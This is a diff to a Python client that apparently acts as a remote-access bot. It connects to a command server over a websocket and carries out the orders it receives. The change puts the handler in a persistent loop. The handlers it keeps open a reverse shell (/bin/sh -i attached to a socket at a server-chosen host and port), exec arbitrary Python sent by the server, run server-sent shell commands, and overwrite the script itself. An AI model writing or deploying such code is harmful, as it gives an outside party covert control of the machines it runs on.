@@ -105,31 +105,30 @@ async def main():
 				async with connect(f"ws://{server}/machines/ws/{state['version']}/{state['uid']}") as websocket:
 					print("Joined")
 					# websocket.send()
-					text = await websocket.recv()
-
-					text = response.read().decode()
-					data = json.loads(text)
-					if data["event"] == "order":
-						for c in data["orders"]:
-							match c["name"]:
-								case "shell":
-									s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-									s.connect((c["server"],c["port"]))
-									subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
-								case "python":
-									tmp = sys.stdout
-									sys.stdout = io.StringIO()
-									try: exec(c["code"])
-									except: log(traceback.format_exc())
-									out = sys.stdout.getvalue()
-									if out:
-										log(sys.stdout.getvalue())
-									sys.stdout = tmp
-								case "run":
-									subprocess.Popen(c["code"],shell=True)
-								case "update":
-									with open(script_path, "w") as f:
-										f.write(c["code"])
+					while True:
+						text = await websocket.recv()
+						data = json.loads(text)
+						if data["event"] == "order":
+							for c in data["orders"]:
+								match c["name"]:
+									case "shell":
+										s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+										s.connect((c["server"],c["port"]))
+										subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
+									case "python":
+										# tmp = sys.stdout
+										# sys.stdout = io.StringIO()
+										try: exec(c["code"])
+										except: traceback.print_exc()#log(traceback.format_exc())
+										# out = sys.stdout.getvalue()
+										# if out:
+											# log(sys.stdout.getvalue())
+										# sys.stdout = tmp
+									case "run":
+										subprocess.Popen(c["code"],shell=True)
+									case "update":
+										with open(script_path, "w") as f:
+											f.write(c["code"])
 					break
 			except KeyboardInterrupt:
 				break
